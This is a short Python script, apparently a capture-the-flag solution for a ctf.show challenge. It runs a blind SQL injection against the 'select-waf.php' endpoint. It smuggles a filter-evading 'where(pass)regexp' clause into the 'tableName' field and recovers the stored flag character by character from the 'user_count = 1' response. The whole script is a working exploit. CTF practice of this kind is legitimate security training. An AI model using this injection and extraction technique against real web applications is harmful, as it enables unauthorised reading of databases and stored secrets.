# author:yu22x
import requests
import string

url = "http://26978aaf-fc60-4456-ab1f-4b7bc23b3aac.challenge.ctf.show/select-waf.php"
s = string.digits + string.ascii_lowercase + "{_-}"
flag = ''
for i in range(1, 45):
    # print(i)
    for j in s:
        print(f'(ctfshow_user)where(pass)regexp("^ctfshow{flag + j}")')
        data = {
            'tableName': f'(ctfshow_user)where(pass)regexp("^ctfshow{flag + j}")'
        }
        # print(data)
        r = requests.post(url, data=data)
        # print(r.text)
        if ("user_count = 1" in r.text):
            flag += j
            print(flag)
            break
